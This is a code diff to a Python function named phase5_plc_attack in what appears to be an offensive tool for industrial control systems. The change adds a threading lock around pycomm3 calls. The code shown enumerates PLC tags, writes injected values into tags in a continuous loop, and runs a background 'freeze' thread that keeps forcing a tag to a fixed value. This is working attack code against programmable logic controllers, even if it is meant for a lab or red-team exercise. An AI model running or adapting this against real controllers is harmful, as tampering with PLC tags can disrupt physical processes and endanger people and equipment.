@@ -1391,6 +1391,9 @@ def phase5_plc_attack() -> PhaseResult:
                 "Verify the PLC is powered on and sshpass is installed on Kali."
             )
 
+        # Single lock serialises all pycomm3 calls — the driver is not thread-safe.
+        plc_lock = threading.Lock()
+
         try:
             # ── Tag enumeration (runs once, table reused in loop) ─────────────
             info("Enumerating PLC tag list...")
@@ -1468,7 +1471,8 @@ def phase5_plc_attack() -> PhaseResult:
                         freeze_tag = None
 
                     if freeze_tag:
-                        freeze_cur = plc_conn.read(freeze_tag)
+                        with plc_lock:
+                            freeze_cur = plc_conn.read(freeze_tag)
                         freeze_cur_val = freeze_cur.value if freeze_cur else 0
                         safe_raw = Prompt.ask(
                             f"[magenta]  Safe value to lock [bold]{freeze_tag}[/bold] at "
@@ -1479,10 +1483,11 @@ def phase5_plc_attack() -> PhaseResult:
                         stop_freeze = threading.Event()
 
                         def _freeze_loop(tag_name=freeze_tag, val=safe_value,
-                                         ev=stop_freeze):
+                                         ev=stop_freeze, lock=plc_lock):
                             while not ev.is_set():
                                 try:
-                                    plc_conn.write((tag_name, val))
+                                    with lock:
+                                        plc_conn.write((tag_name, val))
                                 except Exception:
                                     pass
                                 time.sleep(0.1)
@@ -1522,7 +1527,8 @@ def phase5_plc_attack() -> PhaseResult:
 
                 # ── INNER LOOP: continuous injection on same tag ──────────────
                 while not quit_all:
-                    cur_res = plc_conn.read(tag)
+                    with plc_lock:
+                        cur_res = plc_conn.read(tag)
                     cur_val = cur_res.value if cur_res else "unknown"
 
                     console.print()
@@ -1547,9 +1553,10 @@ def phase5_plc_attack() -> PhaseResult:
 
                     inject_val = _cast(raw_val, cur_val)
 
-                    before = plc_conn.read(tag)
-                    plc_conn.write((tag, inject_val))
-                    after  = plc_conn.read(tag)
+                    with plc_lock:
+                        before = plc_conn.read(tag)
+                        plc_conn.write((tag, inject_val))
+                        after  = plc_conn.read(tag)
 
                     info(f"  Before : {before.value}")
                     ok(f"  After  : [bold green]{after.value}[/bold green]")
